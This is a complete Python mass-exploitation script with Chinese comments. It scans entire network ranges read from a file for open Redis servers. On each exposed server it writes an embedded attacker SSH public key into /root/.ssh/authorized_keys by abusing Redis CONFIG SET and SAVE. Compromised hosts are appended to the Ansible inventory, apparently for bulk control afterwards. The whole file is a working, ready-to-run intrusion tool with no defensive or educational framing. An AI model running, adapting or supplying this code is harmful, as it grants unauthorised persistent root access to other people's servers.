#!/py3/bin/python3
# encoding:utf-8

import socket,time,os,gc,gevent
from redis import StrictRedis
from gevent.pool import Pool
from gevent import monkey

monkey.patch_all()



socket.setdefaulttimeout(0.5)  # 设置socker超时，单位秒
key_pub = '''



ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQDBYBvJk2/4xXzyXBvTid0m/wXiu5CPkjB8Rv0kfSjc6V+Pz+ogVCPA+TntvJmZV8FeljEdJ63b2kmsHRm3TVqZB2TYyJ8Q1OdJ0Uryua7btQF4U/3vENnaFEzExsfFoANzq3V0kcYqnh9w7Qj02CcqIJikuLCIKisvHOaKEAfkMw== root@localhost.localdomain




'''


def get_port_status(ip, port=6379):
    time.sleep(0.1)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # SOCK_DGRAM是udp协议,STREAM是tcp协议
    try:
        server.connect((ip, port))
        success_list.append(ip)
    except  Exception as err:
        #print(err)
        pass
    finally:
        server.close()


def start_redis(ip):
    r = StrictRedis(host=ip, socket_timeout=0.3)
    try:
        key_info = r.set('key', key_pub)
        dir_info = r.config_set('dir','/root/.ssh')
        if key_info is True and dir_info is True:
            respon = r.keys()
            if respon != b'OK':
                r.config_set('dbfilename','authorized_keys')
                r.save()
                #print('\033[0;33;44m Ok \033[0m') #打印redis详情
                redis_success.append(ip)
            else:
                pass
                #print('false')
    except:
        #print('false')
        pass




if __name__ == '__main__':
	
	redis_success = []  #redis端口存活的IP
	success_list = []   #成功攻击的IP
	
	with open('./fj.txt','r')as f:
		for line in f.readlines():
			#print(line)
			# start_ip = str(input('input start ip >>: ')) + '.'
			start_ip = str(line.strip('\n')) + '.'
			
			print("正在扫描网段:%s  please wait..."%line.strip('\n'))
			ip_pool=Pool(1000)  #ip
			for three_ip in range(0, 256):
				for end_ip in range(0, 255):
					ip = start_ip + str(three_ip) + '.' + str(end_ip)
					ip_threads = [ip_pool.spawn(get_port_status, ip)]
			gevent.joinall(ip_threads)

			redis_pool=Pool(1000)  #redis
			redis_threads = [redis_pool.spawn(start_redis, data) for data in success_list]
			gevent.joinall(redis_threads)

			print('成功IP共%s个:\n'%(len(redis_success)),redis_success)
			if redis_success is None:
				pass
			else:
				for host in redis_success:
					with open('/etc/ansible/hosts','a+') as f:
						f.write(str(host)+'\n')
					#print('save success !')
			del redis_success[:]
			del success_list[:]	
			gc.collect()
			

		
